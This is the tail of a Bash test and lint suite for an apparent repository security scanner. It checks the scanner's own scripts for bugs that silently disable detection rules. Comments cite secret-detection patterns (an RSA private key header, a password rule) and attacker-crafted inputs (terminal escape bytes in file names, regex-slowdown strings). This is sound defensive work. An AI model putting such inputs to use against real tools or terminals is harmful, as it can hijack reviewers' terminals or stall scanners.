            fail_test "${f} has no top-level 'local'" "$BAD"
        fi
    done

    # IFS is a SET of delimiter characters, not a delimiter string. Writing
    # IFS=':::' is silently identical to IFS=':' and scatters fields across
    # the empty splits. This class of bug shipped twice (the allowlist loader
    # and the semgrep result parser), so lint for it directly: any quoted IFS
    # assignment longer than one character is a defect.
    for f in ai_transit.sh fetch_repo.sh scan_pipeline.sh docker-run.sh; do
        BAD=$(grep -nE "IFS=('[^']{2,}'|\"[^\"]{2,}\")" "${ROOT_DIR}/${f}" \
              | grep -v '\$' \
              | grep -vE '^[0-9]+:[[:space:]]*#' || true)
        if [[ -z "$BAD" ]]; then
            ok_test "${f} has no multi-character IFS"
        else
            fail_test "${f} has no multi-character IFS" "$BAD"
        fi
    done

    # grep_check must pass its pattern after -e. Without it a pattern that
    # begins with a dash — "-----BEGIN RSA PRIVATE KEY-----" being the one that
    # matters — is parsed as options, and grep exits 2 with "unrecognized
    # option". `if` reads 2 as false, so the rule is silently inert: it never
    # fires and never complains. Same family as the two bugs above.
    BAD=$(grep -nE '^grep_check(_i)?\(\)' "${ROOT_DIR}/scan_pipeline.sh" \
          | grep -v -- '-e ' || true)
    if [[ -z "$BAD" ]]; then
        ok_test "grep_check helpers pass their pattern after -e"
    else
        fail_test "grep_check helpers pass their pattern after -e" "$BAD"
    fi

    # A backslash class inside a bracket expression. GNU grep treats \s, \w and \d
    # as shorthand classes only OUTSIDE a bracket: inside one, [^"\s] is a negated
    # set of the literal characters \ and s. The universal credential rule had it,
    # and so required four characters none of which was an "s" — it missed
    # password = "sup3rs3cret" while looking correct on every test using a value
    # without one. Another instance of the silent-inert-rule family. Comments are
    # skipped, and so are heredoc bodies: the manifest scanner embeds Python, where
    # [\w.-] is correct.
    for f in scan_pipeline.sh fetch_repo.sh ai_transit.sh docker-run.sh; do
        BAD=$(awk '
            inhd { if ($0 == term) inhd = 0; next }
            { if (match($0, /<<-?[[:space:]]*\047?[A-Za-z_]+\047?/)) {
                  t = substr($0, RSTART, RLENGTH); gsub(/<<-?[[:space:]]*|\047/, "", t)
                  term = t; inhd = 1 }
              print NR ": " $0 }' "${ROOT_DIR}/${f}" \
              | grep -vE '^[0-9]+: [[:space:]]*#' \
              | grep -E '\[\^?[^]]*\\[swdSWD][^]]*\]' || true)
        if [[ -z "$BAD" ]]; then
            ok_test "${f} has no backslash class inside a bracket expression"
        else
            fail_test "${f} has no backslash class inside a bracket expression" "$BAD"
        fi
    done

    # `find … | head -N` under `set -o pipefail`. head exits after N lines, find
    # is killed by SIGPIPE once its output no longer fits one write, the pipeline
    # returns 141 and `set -e` aborts the scan with no verdict and no report.
    # `sed -n '1,Np'` reads everything and has none of that. Backslash-continued
    # lines are joined first, because the offending site was split across two.
    BAD=$(sed -e ':a' -e '/\\$/N' -e 's/\\\n[[:space:]]*/ /' -e 'ta' "${ROOT_DIR}/scan_pipeline.sh" \
          | grep -nE 'find .*\|[[:space:]]*head' || true)
    if [[ -z "$BAD" ]]; then
        ok_test "scan_pipeline.sh has no find piped into head"
    else
        fail_test "scan_pipeline.sh has no find piped into head" "$BAD"
    fi

    # The file-type slide deck lists every extension and basename pattern the
    # scanner routes. A deck that omits a route, or lists one that no longer exists,
    # misleads exactly the people who rely on it, so it is compared with
    # classify_file() on every run. Regenerate with: python3 build_pdf_filetypes.py
    DECK_DIFF=$(python3 "${ROOT_DIR}/build_pdf_filetypes.py" --check 2>&1 || true)
    if python3 "${ROOT_DIR}/build_pdf_filetypes.py" --check >/dev/null 2>&1; then
        ok_test "the file-type deck matches the routes in classify_file()"
    else
        fail_test "the file-type deck matches the routes in classify_file()" "$DECK_DIFF"
    fi

    # `echo -e` on a message. File names, archive entry names and finding text come
    # from the repository being scanned, and `echo -e` turns a literal \033 in one
    # into a real escape byte, which can retitle or otherwise drive the reviewer's
    # terminal. Messages go through printf %s (after control bytes are replaced).
    # Comment lines are skipped.
    BAD=$(grep -nE 'echo -e[^#]*\$[*@]' "${ROOT_DIR}/scan_pipeline.sh" \
          | grep -vE '^[0-9]+:[[:space:]]*#' || true)
    if [[ -z "$BAD" ]]; then
        ok_test "scan_pipeline.sh never passes \$* through echo -e"
    else
        fail_test "scan_pipeline.sh never passes \$* through echo -e" "$BAD"
    fi

    # The Python helpers (_jar_facts in transit/containers/jar.py, _office_facts in .../office.py) read documents an attacker built to
    # be slow. `[^>]*`, `[^>]+`, `.*?` and `.+?` rescan to the end of the input for every opener
    # that never closes, so "<a<a<a…" a few MB long runs for minutes: a 3 KB jar once took the
    # pipeline 98 s. Use `[^<>]*`, str.find, or the linear TAG tokenizer. Comments are skipped.
    for _fn in _jar_facts _office_facts; do
        case "$_fn" in _jar_facts) _hf="transit/containers/jar.py" ;; *) _hf="transit/containers/office.py" ;; esac
        BAD=$(grep -nE '\[\^>\][*+]|\.\*\?|\.\+\?' "${ROOT_DIR}/${_hf}" | grep -vE '^[0-9]+: *#' || true)
        if [[ -z "$BAD" ]]; then
            ok_test "${_fn} has no unbounded lazy or [^>]* pattern"
        else
            fail_test "${_fn} has no unbounded lazy or [^>]* pattern" "$BAD"
        fi
    done

    # A RETURN trap is not scoped to the function that installs it: it keeps
    # firing as later functions return. If its body defers expansion — single
    # quotes around '$tmp' rather than double — then by the time it runs in some
    # other function the variable is out of scope and set -u aborts the whole
    # scan. That is how the first cut of scan_pdf() killed every run after the
    # first PDF. A RETURN trap must bake its paths in at install time, so a
    # single-quoted body referencing a variable is a defect.
    for f in ai_transit.sh fetch_repo.sh scan_pipeline.sh docker-run.sh; do
        BAD=$(grep -nE "trap[[:space:]]+'[^']*\\\$[^']*'[[:space:]]+RETURN" \
              "${ROOT_DIR}/${f}" \
              | grep -vE '^[0-9]+:[[:space:]]*#' || true)
        if [[ -z "$BAD" ]]; then
            ok_test "${f} has no RETURN trap that defers variable expansion"
        else
            fail_test "${f} has no RETURN trap that defers variable expansion" "$BAD"
        fi
    done

    # Documentation quotes the assertion count ("68/68 passed", "68 assertions")
    # in several places. Those numbers drift silently every time a test is added,
    # and a doc that misstates its own verification is a doc readers stop
    # trusting. Check them against the real total.
    #
    # Compared against PASS_N, the number of assertions that have actually run
    # by this point; this group is last, so it is close to the final total.
    #
    # Counting assertion *call sites* in this file instead does not work: sites
    # inside the per-script lint loops run four times each, and sites in
    # branches that did not execute never run at all, so the figure lands well
    # above the real total (95 against 84). An EXPECTED_N doing exactly that
    # sat here unused, with a comment claiming it was the expectation.
    STALE=""
    while IFS= read -r hit; do
        [[ -z "$hit" ]] && continue
        num="${hit##*:}"
        num="${num%%/*}"; num="${num%% *}"
        # Allow a small margin: the point is to catch drift, not to force an
        # edit for every single new assertion.
        if (( num < PASS_N - 6 || num > PASS_N + 6 )); then
            STALE+="${hit}"$'\n'
        fi
    done < <(grep -rnoE '[0-9]+/[0-9]+ passed|[0-9]+ assertions' \
             "${ROOT_DIR}"/*.md "${ROOT_DIR}"/build_*.py 2>/dev/null || true)

    # Count how many references exist at all. A sed that runs with an empty
    # variable silently deletes the number rather than updating it, leaving
    # "Expected: ✔ / passed" — and a guard that only checks values would pass on
    # that, because there is no longer a value to disagree with.
    N_REFS=$(grep -rcoE '[0-9]+/[0-9]+ passed|[0-9]+ assertions' \
             "${ROOT_DIR}"/*.md "${ROOT_DIR}"/build_*.py 2>/dev/null \
             | awk -F: '{n+=$2} END{print n+0}')

    if [[ -n "$FILTER" ]]; then
        # Under a filter PASS_N counts only the selected groups, so comparing
        # documented totals against it would report false drift.
        skip_test "documented assertion counts match the suite" "run without a filter"
    elif (( N_REFS < 5 )); then
        fail_test "documented assertion counts match the suite" \
                  "only ${N_REFS} count reference(s) found across the docs — numbers were likely deleted rather than updated"
    elif [[ -z "$STALE" ]]; then
        ok_test "documented assertion counts match the suite"
    else
        fail_test "documented assertion counts match the suite" \
                  "suite reports ${PASS_N}; stale references:"$'\n'"${STALE}"
    fi

    # Section cross-references break silently when sections are renumbered, and
    # INSTALL.md has been renumbered twice. Verify every "§N" and "§N.M" points
    # at a heading that exists.
    BADREF=$(python3 - "${ROOT_DIR}/INSTALL.md" <<'PY'
import re, sys
s = open(sys.argv[1]).read()
heads = {(m.group(1) if not m.group(2) else f"{m.group(1)}.{m.group(2)}")
         for m in re.finditer(r'^#{2,3} (\d+)(?:\.(\d+))?\.?\s', s, re.M)}
bad = sorted({r for r in re.findall(r'§(\d+(?:\.\d+)?)', s) if r not in heads})
print(' '.join('§'+b for b in bad))
PY
)
    if [[ -z "$BADREF" ]]; then
        ok_test "INSTALL.md cross-references all resolve"
    else
        fail_test "INSTALL.md cross-references all resolve" "dangling: ${BADREF}"
    fi

    if command -v shellcheck &>/dev/null; then
        SC_FAIL=""
        for f in ai_transit.sh fetch_repo.sh scan_pipeline.sh docker-run.sh; do
            shellcheck --severity=error "${ROOT_DIR}/${f}" >/dev/null 2>&1 || SC_FAIL+="${f} "
        done
        if [[ -z "$SC_FAIL" ]]; then
            ok_test "shellcheck reports no errors"
        else
            fail_test "shellcheck reports no errors" "failing: ${SC_FAIL}"
        fi
    else
        skip_test "shellcheck" "not installed"
    fi
fi

# ── Summary ───────────────────────────────────────────────────────────────────
echo
echo -e "${BOLD}────────────────────────────────────────${RESET}"
TOTAL=$(( PASS_N + FAIL_N ))
if (( FAIL_N == 0 )); then
    echo -e "${GREEN}${BOLD}  ✔  ${PASS_N}/${TOTAL} passed${RESET}${SKIP_N:+  (${SKIP_N} skipped)}"
    echo
    exit 0
else
    echo -e "${RED}${BOLD}  ✘  ${FAIL_N} of ${TOTAL} failed${RESET}${SKIP_N:+  (${SKIP_N} skipped)}"
    echo
    for f in "${FAILURES[@]}"; do echo -e "    ${RED}•${RESET} $f"; done
    echo
    exit 1
fi
